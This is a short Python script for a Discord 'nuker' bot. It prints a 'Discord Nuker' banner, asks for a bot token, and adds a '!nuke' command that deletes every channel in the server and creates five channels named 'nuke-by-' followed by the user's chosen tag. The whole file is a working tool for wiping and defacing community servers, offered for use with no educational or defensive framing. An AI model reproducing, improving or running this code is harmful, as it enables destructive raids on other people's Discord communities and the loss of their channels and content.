import discord
from discord.ext import commands

print('----------------------------------------------------------------------------------------------------------------------')    
print("   ___    _                           __        _  __         __             ")
print("  / _ \  (_)  ___ ____ ___   ____ ___/ /       / |/ / __ __  / /__ ___   ____")
print(" / // / / /  (_-</ __// _ \ / __// _  /       /    / / // / /  '_// -_) / __/")
print("/____/ /_/  /___/\__/ \___//_/   \_,_/       /_/|_/  \_,_/ /_/\_\ \__/ /_/")   
print('')
print('----------------------------------------------------------------------------------------------------------------------')    

while True :
    intents = discord.Intents.all()
    intents.members = True
    channel_name = input("sign (empty=ano) ? ")
    bot = commands.Bot(command_prefix='!', intents=intents)
    TOKEN = str(input('Token :'))
#sx
    @bot.event
    async def on_ready():
        await bot.change_presence(activity=discord.Game(name="Ready"))
        print('')
        print('Destroyer is ready')
        print('Connecté en tant que {0.user}'.format(bot))
        print('!nuke')
        print('')

    @bot.command()
    async def nuke(ctx):
        '''sx'''
        guild = ctx.guild
        for channel in guild.channels:
            await channel.delete()
        for i in range(5):
            if channel_name == "":
                await guild.create_text_channel("nuke-by-ano")
            else:
                await guild.create_text_channel("nuke-by-"+channel_name)


    async def on_command_error(ctx, error):
        if isinstance(error, commands.CommandNotFound):
            await ctx.send("Commande introuvable.")
        else:
            raise error

    try:
        bot.run(TOKEN)
    except Exception as e:
        print("Une erreur est survenue : ", e)





















































































#sx
